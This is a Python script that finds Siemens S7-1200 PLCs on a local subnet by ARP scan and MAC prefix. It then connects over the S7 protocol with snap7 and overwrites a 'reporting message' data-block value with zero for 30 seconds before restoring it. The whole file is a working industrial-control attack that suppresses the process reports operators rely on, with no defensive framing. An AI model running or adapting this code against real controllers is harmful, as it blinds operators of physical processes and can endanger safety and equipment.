import snap7
import socket
import struct
import time
import threading
import scapy.all as scapy

# Configuration (adjust as needed)
PLC_IP = None  # Will be discovered if None
PLC_RACK = 0
PLC_SLOT = 1
REPORTING_MESSAGE_IDENTIFIER = "DB1.DBW0"  # Example: Data Block 1, Word 0 (adjust based on your system)
BLOCK_DURATION = 30  # seconds
INTERFACE = "eth0" # Your network interface name

# --- IP Discovery Functions ---
def get_plc_ip_address():
    """
    Scans the network for Siemens S7-1200 PLCs and returns the IP address.
    Requires root privileges or sudo for running scapy.
    """
    try:
        arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Change to your network range
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=INTERFACE)[0]  # specify the interface here.
        
        for element in answered_list:
            if element[1].hwsrc.startswith("00:0f:e2"):  # Siemens MAC address prefix
                print(f"Found Siemens PLC with IP: {element[1].psrc}")
                return element[1].psrc
        print("No Siemens PLC found in the specified network range.")
        return None
    except PermissionError:
        print("Error: Requires root privileges to scan the network using Scapy.")
        print("Please run the script with sudo or as root.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None


# --- S7 Communication Functions ---

def read_plc_data(plc, data_address):
    """Reads data from the PLC.  Returns None if there is an error."""
    db_number = int(data_address.split(".")[0].replace("DB", ""))
    data_type = data_address.split(".")[1][:3]
    offset = int(data_address.split(".")[1][3:])
    
    try:
        if data_type == "DBB":
            result = plc.db_read(db_number, offset, 1)
            return struct.unpack(">B", result)[0]  # Unpack as unsigned byte
        elif data_type == "DBW":
            result = plc.db_read(db_number, offset, 2)
            return struct.unpack(">H", result)[0]  # Unpack as unsigned short (word)
        elif data_type == "DBD":
            result = plc.db_read(db_number, offset, 4)
            return struct.unpack(">I", result)[0]  # Unpack as unsigned int (dword)
        elif data_type == "DBX":
            byte_offset = offset // 8
            bit_offset = offset % 8
            result = plc.db_read(db_number, byte_offset, 1)
            byte_value = struct.unpack(">B", result)[0]
            return (byte_value >> bit_offset) & 1  # Extract the bit
        else:
            print(f"Unsupported data type: {data_type}")
            return None
    except Exception as e:
        print(f"Error reading data from PLC: {e}")
        return None


def block_reporting_message(plc, data_address):
    """Blocks the reporting message by writing a null value to the PLC.
    IMPORTANT: Adjust this function to write the CORRECT null value based on the data type."""
    db_number = int(data_address.split(".")[0].replace("DB", ""))
    data_type = data_address.split(".")[1][:3]
    offset = int(data_address.split(".")[1][3:])
    
    try:
        if data_type == "DBB":
            # Write a null byte (0)
            plc.db_write(db_number, offset, bytes([0]))
        elif data_type == "DBW":
            # Write a null word (0)
            plc.db_write(db_number, offset, struct.pack(">H", 0))
        elif data_type == "DBD":
            # Write a null dword (0)
            plc.db_write(db_number, offset, struct.pack(">I", 0))
        elif data_type == "DBX":
             # Clear the bit (set to 0) - requires read-modify-write approach
            byte_offset = offset // 8
            bit_offset = offset % 8
            
            # Read the current byte
            current_byte = plc.db_read(db_number, byte_offset, 1)
            byte_value = struct.unpack(">B", current_byte)[0]
            
            # Clear the bit (set to 0)
            byte_value &= ~(1 << bit_offset)
            
            # Write the modified byte back
            plc.db_write(db_number, byte_offset, bytes([byte_value]))

        else:
            print(f"Unsupported data type: {data_type}")
            return False

        print(f"Successfully blocked reporting message at {data_address}")
        return True

    except Exception as e:
        print(f"Error blocking reporting message: {e}")
        return False



def restore_reporting_message(plc, data_address, original_value):
    """Restores the reporting message to its original value."""
    db_number = int(data_address.split(".")[0].replace("DB", ""))
    data_type = data_address.split(".")[1][:3]
    offset = int(data_address.split(".")[1][3:])

    try:
        if data_type == "DBB":
            plc.db_write(db_number, offset, struct.pack(">B", original_value))
        elif data_type == "DBW":
            plc.db_write(db_number, offset, struct.pack(">H", original_value))
        elif data_type == "DBD":
            plc.db_write(db_number, offset, struct.pack(">I", original_value))
        elif data_type == "DBX":
            byte_offset = offset // 8
            bit_offset = offset % 8
            
            # Read the current byte
            current_byte = plc.db_read(db_number, byte_offset, 1)
            byte_value = struct.unpack(">B", current_byte)[0]
            
            # Set the bit (set to 1)
            byte_value |= (original_value << bit_offset)
            
            # Write the modified byte back
            plc.db_write(db_number, byte_offset, bytes([byte_value]))


        else:
            print(f"Unsupported data type: {data_type}")
            return False

        print(f"Successfully restored reporting message at {data_address}")
        return True

    except Exception as e:
        print(f"Error restoring reporting message: {e}")
        return False



def blocking_task(plc, data_address):
    """Blocks the reporting message for a specified duration and then restores it."""
    try:
        # Read the original value before blocking
        original_value = read_plc_data(plc, data_address)

        if original_value is None:
            print("Failed to read original value.  Aborting blocking.")
            return

        if block_reporting_message(plc, data_address):
            print(f"Blocking reporting message for {BLOCK_DURATION} seconds...")
            time.sleep(BLOCK_DURATION)
            if original_value is not None: #check again in case if None somehow
                restore_reporting_message(plc, data_address, original_value)
            else:
                print("Original value is None, cannot restore")

        else:
            print("Failed to block reporting message.")

    except Exception as e:
        print(f"Error in blocking task: {e}")


# --- Main Program ---

if __name__ == "__main__":
    if PLC_IP is None:
        PLC_IP = get_plc_ip_address()
        if PLC_IP is None:
            print("PLC IP address not found. Exiting.")
            exit(1)

    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        # Start the blocking task in a separate thread
        blocking_thread = threading.Thread(target=blocking_task, args=(plc, REPORTING_MESSAGE_IDENTIFIER))
        blocking_thread.start()

        blocking_thread.join() # Wait for the blocking thread to finish

    except Exception as e:
        print(f"Error connecting to PLC: {e}")

    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")